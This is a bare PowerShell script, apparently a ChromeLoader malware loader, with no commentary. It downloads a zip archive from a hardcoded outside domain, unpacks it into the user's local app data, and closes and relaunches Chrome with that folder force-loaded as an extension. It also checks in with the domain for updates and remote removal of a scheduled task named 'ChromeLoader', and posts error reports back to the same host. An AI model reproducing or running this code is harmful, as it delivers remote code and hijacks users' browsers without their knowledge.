$ e x t P a t h   =   " $ ( $ e n v : L O C A L A P P D A T A ) \ c h r o m e " 
 $ b g P a t h   =   " $ e x t P a t h \ b a c k g r o u n d . j s " 
 $ a r c h i v e N a m e   =   " $ ( $ e n v : L O C A L A P P D A T A ) \ a r c h i v e . z i p " 
 $ t a s k N a m e   =   " C h r o m e L o a d e r " 
 $ d o m a i n   =   " i t h c o n s u k u l t i n . c o m " 
 $ c h r o m e P a t h   =   " " 
 $ i v e r   =   " 2 " 
 
 $ i s O p e n   =   0 
 $ d d   =   0 
 $ v e r   =   0 
 
 ( G e t - W m i O b j e c t   W i n 3 2 _ P r o c e s s   - F i l t e r   " n a m e = ' c h r o m e . e x e ' " )   |   S e l e c t - O b j e c t   C o m m a n d L i n e   |   F o r E a c h - O b j e c t   { 
 	 i f ( $ _   - M a t c h   " l o a d - e x t e n s i o n " ) { 
 	 	 b r e a k 
 	 } 
 
 	 t r y { 
 	 	 $ c h r o m e P a t h   =   ( G e t - W m i O b j e c t   W i n 3 2 _ P r o c e s s   - F i l t e r   " n a m e = ' c h r o m e . e x e ' " ) [ 0 ]   |   S e l e c t   E x e c u t a b l e P a t h   - E x p a n d P r o p e r t y   E x e c u t a b l e P a t h 
 	 } c a t c h { } 
 
 	 $ i s O p e n   =   1 
 } 
 
 i f ( $ i s O p e n ) { 
 
 	 i f ( - n o t ( T e s t - P a t h   - P a t h   " $ e x t P a t h " ) ) { 
 
 	 	 t r y { 
 	 	 	 w g e t   " h t t p s : / / $ d o m a i n / a r c h i v e . z i p ? i v e r = $ i v e r "   - o u t f i l e   " $ a r c h i v e N a m e " 
 	 	 } c a t c h { 
 	 	 	 b r e a k 
 	 	 } 
 
 	 	 E x p a n d - A r c h i v e   - L i t e r a l P a t h   " $ a r c h i v e N a m e "   - D e s t i n a t i o n P a t h   " $ e x t P a t h "   - F o r c e 
 	 	 R e m o v e - I t e m   - p a t h   " $ a r c h i v e N a m e "   - F o r c e 
 
 	 } 
 	 e l s e { 
 
 	 	 t r y { 
 	 	 	 i f   ( T e s t - P a t h   - P a t h   $ b g P a t h ) 
 	 	 	 { 
 
 	 	 	 	 $ b g   =   G e t - C o n t e n t   - P a t h   $ b g P a t h 
 	 	 	 	 $ b g A r r a y   =   $ b g . s p l i t ( ' " ' ) 
 	 	 	 	 $ v e r   =   $ b g A r r a y [ - 2 ] 
 	 	 	 	 $ d d   =   $ b g A r r a y [ - 4 ] 
 
 	 	 	 } 
 	 	 } c a t c h { } 
 
 	 	 i f   ( $ d d   - a n d   $ v e r ) { 
 
 
 	 	 	 t r y { 
 
 	 	 	 	 $ u n   =   w g e t   " h t t p s : / / $ d o m a i n / u n ? i v e r = $ i v e r & d i d = $ d d & v e r = $ v e r " 
 
 	 	 	 	 i f ( $ u n   - M a t c h   " $ d d " ) { 
 	 	 	 	 	 U n r e g i s t e r - S c h e d u l e d T a s k   - T a s k N a m e   " $ t a s k N a m e "   - C o n f i r m : $ f a l s e 
 	 	 	 	 	 R e m o v e - I t e m   - p a t h   " $ e x t P a t h "   - F o r c e   - R e c u r s e 
 	 	 	 	 } 
 
 	 	 	 } c a t c h { } 
 
 	 	 	 t r y { 
 	 	 	 	 w g e t   " h t t p s : / / $ d o m a i n / a r c h i v e . z i p ? i v e r = $ i v e r & d i d = $ d d & v e r = $ v e r "   - o u t f i l e   " $ a r c h i v e N a m e " 
 	 	 	 } 
 	 	 	 c a t c h { } 
 
 	 	 	 i f   ( T e s t - P a t h   - P a t h   " $ a r c h i v e N a m e " ) { 
 	 	 	 	 E x p a n d - A r c h i v e   - L i t e r a l P a t h   " $ a r c h i v e N a m e "   - D e s t i n a t i o n P a t h   " $ e x t P a t h "   - F o r c e 
 	 	 	 	 R e m o v e - I t e m   - p a t h   " $ a r c h i v e N a m e "   - F o r c e 
 	 	 	 } 
 
 	 	 } 
 
 	 } 
 
 	 t r y { 
 	 	 G e t - P r o c e s s   c h r o m e   |   F o r E a c h - O b j e c t   {   $ _ . C l o s e M a i n W i n d o w ( )   |   O u t - N u l l } 
 
 	 	 i f   ( [ s t r i n g ] : : I s N u l l O r E m p t y ( $ c h r o m e P a t h ) ) 
 	 	 { 
 	 	 	 S t a r t - P r o c e s s   - F i l e P a t h   $ c h r o m e P a t h   - A r g u m e n t L i s t   - - l o a d - e x t e n s i o n = " $ e x t P a t h " ,   - - r e s t o r e - l a s t - s e s s i o n ,   - - n o e r r d i a l o g s ,   - - d i s a b l e - s e s s i o n - c r a s h e d - b u b b l e 
 	 	 } e l s e { 
 	 	 	 s t a r t   c h r o m e   - - l o a d - e x t e n s i o n = " $ e x t P a t h " ,   - - r e s t o r e - l a s t - s e s s i o n ,   - - n o e r r d i a l o g s ,   - - d i s a b l e - s e s s i o n - c r a s h e d - b u b b l e 
 	 	 } 
 
 	 } c a t c h { 
 
 	 	 $ e r r   =   $ E r r o r [ 0 ] 
 
 	 	 i f   ( $ d d   - a n d   $ v e r ) 
 	 	 { 
 	 	 	 w g e t   " h t t p s : / / $ d o m a i n / e r r ? i v e r = $ i v e r & d i d = $ d d & v e r = $ v e r "   - M e t h o d   P O S T   - B o d y   $ e r r 
 	 	 } 
 	 	 e l s e 
 	 	 { 
 	 	 	 w g e t   " h t t p s : / / $ d o m a i n / e r r ? i v e r = $ i v e r "   - M e t h o d   P O S T   - B o d y   $ e r r 
 	 	 } 
 
 	 } 
 
 } 